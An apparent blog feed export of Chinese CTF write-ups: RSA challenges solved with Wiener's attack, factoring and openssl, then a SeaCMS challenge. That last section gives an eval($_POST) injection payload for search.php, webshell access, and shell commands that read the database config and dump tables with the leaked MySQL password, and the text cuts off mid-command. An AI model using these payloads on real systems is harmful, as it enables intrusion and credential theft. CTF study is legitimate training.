Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : RSAowiener.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> owiener</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x01f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3</span></span><br><span class="line">n = <span class="number">0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span></span><br><span class="line">d = owiener.attack(e, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> d <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    print(<span class="string">"Failed"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Hacked d=&#123;&#125;"</span>.format(d))</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803291937.png" alt="1526803291937"></p><p>拿到d</p><blockquote><p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p></blockquote><p>生成私钥</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803354777.png" alt="1526803354777"></p><p>解密，打开flag.txt拿到flag</p><blockquote><blockquote><p>openssl rsautl -decrypt -in flag.enc -inkey bugkursa.pem -out flag.txt</p></blockquote></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803369199.png" alt="1526803369199"></p><p>或者用脚本解密，来自<a href="http://www.test404.com/post-1107.html" target="_blank" rel="noopener">http://www.test404.com/post-1107.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span></span><br><span class="line">e=<span class="number">0x1f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3</span></span><br><span class="line">d=<span class="number">8264667972294275017293339772371783322168822149471976834221082393409363691895</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line">data = data.encode(<span class="string">"hex"</span>)</span><br><span class="line">c = int(data,<span class="number">16</span>)</span><br><span class="line">mingwen = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(mingwen)</span><br><span class="line">result = hex(mingwen)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">result = <span class="string">"0"</span>+result</span><br><span class="line">result = result.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(result)</span><br></pre></td></tr></table></figure><blockquote><p>flag{W0rld_Of_Crypt0gr@phy}</p></blockquote><p>参考：</p><p><a href="https://blog.csdn.net/preserphy/article/details/79599397" target="_blank" rel="noopener">https://blog.csdn.net/preserphy/article/details/79599397</a></p><p><a href="http://wiki.idbg.net/docs/show/41" target="_blank" rel="noopener">http://wiki.idbg.net/docs/show/41</a></p><p>CRC32：<a href="http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">http://veritas501.space/2017/06/23/%E7%BB%99%E4%BD%A0%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8D%B4%E4%B8%8D%E7%BB%99%E4%BD%A0%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%BA%E5%88%B0%E5%BA%95%E5%9C%A8%E6%83%B3%E4%BB%80%E4%B9%88/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本来AFCTF2018校赛前刷了一半了，然后搞校赛了，然后才这个周末刷完。&lt;/p&gt;
&lt;p&gt;待会还有安恒杯月赛，手有点酸，哈哈。&lt;/p&gt;
    
    </summary>
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/categories/Misc/"/>
    
      <category term="Bugku-MISC" scheme="http://blog.Lhaihai.wang/categories/Misc/Bugku-MISC/"/>
    
    
      <category term="Misc" scheme="http://blog.Lhaihai.wang/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>第一周RSA加密解密入门</title>
    <link href="http://blog.Lhaihai.wang/2018/05/10/%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <id>http://blog.Lhaihai.wang/2018/05/10/第一周/</id>
    <published>2018-05-10T15:05:34.000Z</published>
    <updated>2018-05-15T05:07:14.172Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-复习密码学"><a href="#0x00-复习密码学" class="headerlink" title="0x00 复习密码学"></a>0x00 复习密码学</h3><p>占个位置慢慢写</p><a id="more"></a><h3 id="0x01-RSA密钥生成"><a href="#0x01-RSA密钥生成" class="headerlink" title="0x01  RSA密钥生成"></a>0x01  RSA密钥生成</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927341309.png" alt="1525927341309"></p><p>题目</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927574315.png" alt="1525927574315"></p><p>直接使用RSA-Tool 工具，因为p和q都是只有数字，所以猜测是十进制，修改右上角的Number Base为10，填入p，q，e（16进制），点击左下角的Cale.D生成密钥d</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525927594829.png" alt="1525927594829"></p><h3 id="0x01-RSA解密"><a href="#0x01-RSA解密" class="headerlink" title="0x01 RSA解密"></a>0x01 RSA解密</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525928096379.png" alt="1525928096379"></p><p><a href="https://blog.csdn.net/as3luyuan123/article/details/16812011" target="_blank" rel="noopener">OpenSSL命令—rsautl</a> </p><p>题目：</p><p>拿到一个zip包，用010Editor打开修改密码标记位，解压后有两个文件</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525929032341.png" alt="1525929032341"></p><p>发现imhere文件是私钥，flag是密文</p><p>所以解密命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag -inkey imhere -out a.txt</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525928721540.png" alt="1525928721540"></p><p>打开a.txt即可拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;c42bcf773d54cf03&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-RSA破解"><a href="#0x03-RSA破解" class="headerlink" title="0x03  RSA破解"></a>0x03  RSA破解</h3><p><a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">https://github.com/ius/rsatool</a> </p><p><a href="http://www.whaledu.com/article/17" target="_blank" rel="noopener">RSAtool之python版</a></p><p><a href="http://www.cnblogs.com/pcat/p/5746821.html" target="_blank" rel="noopener">gmpy2安装使用方法</a></p><p>如果kali上不了网，参考下面链接</p><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884" target="_blank" rel="noopener">https://blog.csdn.net/chenyanhui1087/article/details/53127884</a></p><p>注：不需要单独安装gmpy2，只要像下图直接pip install gmpy，pip会把其它依赖包一起装好</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525930763701.png" alt="1525930763701"></p><p>题目：</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525937295679.png" alt="1525937295679"></p><p>解题思路</p><p>只有公钥和密文，爆破公钥拿到 p，q，e，生成私钥，用私钥解密密文</p><p>解题过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# openssl rsa -pubin -text -modulus -in public.pem </span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:ca:00:f5:ed:7b:33:b9:bd:42:1e:77:31:8a:a1:</span><br><span class="line">    78:e7:5d:ed:e3:cb:1b:c7:d4:7a:7d:14:3b:e7:49:</span><br><span class="line">    1c:90:25</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=CA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMoA9e17M7m9Qh53MYqheOdd7ePLG8fU</span><br><span class="line">en0UO+dJHJAlAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>按住shift + 鼠标右键 打开 windows powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> .\msieve153.exe 0xCA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1</span><br><span class="line">BC7D47A7D143BE7491C9025 -v</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525938842077.png" alt="1525938842077"></p><p>得到了，p，q，e，接下来我们要生成私钥了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py  -p 290579950064240059571837821251441436997 -q 314436328879392457343835667929324128609 -e 65537 -o pri.pem-f PEM</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525939930698.png" alt="1525939930698"></p><p>得到私钥后解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey pri.prm -out flag.txt</span><br></pre></td></tr></table></figure><p>flag:</p><p>whalectf{256_n_get}</p><h3 id="0x04-密码学—只有密文"><a href="#0x04-密码学—只有密文" class="headerlink" title="0x04  密码学—只有密文"></a>0x04  密码学—只有密文</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>怎么办，已经截获了密文和模数n！能够破解吗？请分解出RSA中的两个大素数q和p。提交格式是key{x}x为两个素数中较小的那个的MD5前8位。 </p><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><a href="http://www.cnblogs.com/pcat/p/7508205.html" target="_blank" rel="noopener">yafu安装使用方法以及mismatched parens解决方法</a></p><p>感谢小辣鸡的帮助(〃’▽’〃)</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525959883924.png" alt=""></p><p>简单来说就是gcd遍历一遍，gcd（n，某密文）</p><p>gcd（a,b）就是求a，b两个数之间的最大公约数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/10 21:13</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 只有密文.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line"></span><br><span class="line">print(gcd(<span class="number">10</span>,<span class="number">5</span>))</span><br><span class="line">x = open(<span class="string">'E:\\CTF\蓝鲸安全\\第一周\\ciphertext.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> x.readlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Ciphertext'</span> <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> len(line)&gt;<span class="number">2</span>:</span><br><span class="line">        print(gcd(n,int(line[:<span class="number">-1</span>])))</span><br></pre></td></tr></table></figure><p>跑出来一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13038371855775914836995578093728166671103633520203033965827703187246607207039273968425501296569317295959057439253867586769212037981452712871242668046329877</span><br></pre></td></tr></table></figure><p>再算另外一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10367615840240242845371941453623373821227053765532752994306127876946421006862147600725324340607889088707606730457021312059130583835286311559997627141422127</span><br></pre></td></tr></table></figure><p>md5一下小的数</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E8%93%9D%E9%B2%B8%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E5%91%A8RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.assets/1525960026348.png" alt="1525960026348"></p><p>最后flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;f49d7fe6&#125;</span><br></pre></td></tr></table></figure><p>DJ推荐了个刷密码学的网站：<a href="https://id0-rsa.pub/" target="_blank" rel="noopener">https://id0-rsa.pub/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-复习密码学&quot;&gt;&lt;a href=&quot;#0x00-复习密码学&quot; class=&quot;headerlink&quot; title=&quot;0x00 复习密码学&quot;&gt;&lt;/a&gt;0x00 复习密码学&lt;/h3&gt;&lt;p&gt;占个位置慢慢写&lt;/p&gt;
    
    </summary>
    
      <category term="whalectf" scheme="http://blog.Lhaihai.wang/categories/whalectf/"/>
    
    
      <category term="crypto" scheme="http://blog.Lhaihai.wang/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>百度杯CTF夺旗大赛9月场第三场Test</title>
    <link href="http://blog.Lhaihai.wang/2018/05/06/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E5%A4%BA%E6%97%97%E5%A4%A7%E8%B5%9B9%E6%9C%88%E5%9C%BA%E7%AC%AC%E4%B8%89%E5%9C%BATest/"/>
    <id>http://blog.Lhaihai.wang/2018/05/06/百度杯CTF夺旗大赛9月场第三场Test/</id>
    <published>2018-05-06T05:29:46.000Z</published>
    <updated>2018-05-06T06:49:11.458Z</updated>
    
    <content type="html"><![CDATA[<h3 id="百度杯-九月场-Test"><a href="#百度杯-九月场-Test" class="headerlink" title="百度杯  九月场 Test"></a>百度杯  九月场 Test</h3><hr><a id="more"></a><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>下载解压zip到www，访问upload</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534518399.png" alt="1525534518399"></p><p>安装成功</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534547711.png" alt="1525534547711"></p><p>构造playload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure><p>使用菜刀连接</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534755429.png" alt="1525534755429"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534772590.png" alt="1525534772590"></p><p>看了一下search.php包含了common.php，根据common.php中的内容发现数据库的链接配置写在data/common.inc.php中。</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525534948001.png" alt="1525534948001"></p><p>用户名为root，密码为空，使用菜刀连接数据库    </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535000747.png" alt="1525535000747"></p><p>即可访问数据库</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535071501.png" alt="1525535071501"></p><p>查询 sea_admin表，拿到管理员账号和密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535131544.png" alt="1525535131544"></p><h4 id="I春秋-CTF大本营环境"><a href="#I春秋-CTF大本营环境" class="headerlink" title="I春秋 CTF大本营环境"></a>I春秋 CTF大本营环境</h4><p>尝试使用菜刀连接，但被安全狗过滤了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535542553.png" alt="1525535542553"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525535773485.png" alt="1525535773485"></p><p>皮一下很开心，找到一篇使用命令的writeup，那就来吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=$a = `cat data/common.inc.php` ; var_dump(a);</span><br></pre></td></tr></table></figure><p>列当前目录下的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`ls`;var_dump($a);</span><br><span class="line">1=$a=`ls \data`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(198) &quot;admin admin_d41d8cd98f00b204e9800998.php backupdata cache common.inc.php config.cache.bak.php config.cache.inc.php config.ftp.php config.ucenter.php config.user.inc.php cron.cache.php mark sessions &quot;</span><br></pre></td></tr></table></figure><p>获取配置文件,因为是php代码所以在前端看不到，查看源代码就看到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`cat data/common.inc.php`;var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537849621.png" alt="1525537849621"></p><p>————————————源代码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537784520.png" alt="1525537784520"></p><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;show databases;&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(35) &quot;Database information_schema seacms &quot;</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537066568.png" alt="1525537066568"></p><p>获取seacms数据库的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;show tables from seacms&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><p>发现有个敏感表：flag_140ad2e0d8cb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(398) &quot;Tables_in_seacms flag_140ad2e0d8cb sea_admin sea_arcrank sea_buy sea_cck sea_co_cls sea_co_config sea_co_data sea_co_filters sea_co_news sea_co_type sea_co_url sea_comment sea_content sea_count sea_crons sea_data sea_erradd sea_favorite sea_flink sea_guestbook sea_jqtype sea_member sea_member_group sea_myad sea_mytag sea_news sea_playdata sea_search_keywords sea_tags sea_temp sea_topic sea_type &quot;</span><br></pre></td></tr></table></figure><p>尝试从表中获取数据,然而被安全狗拦截了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;select * from seacms.flag_140ad2e0d8cb&quot;`;var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C/%E8%AF%BB%E4%B9%A6%E6%8A%A5%E5%91%8A.assets/1525537257166.png" alt="1525537257166"></p><p>手误试了下把*后面的空格去掉，没想到就拿到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=$a=`mysql -usea_user -p46e06533407e -e &quot;select *from 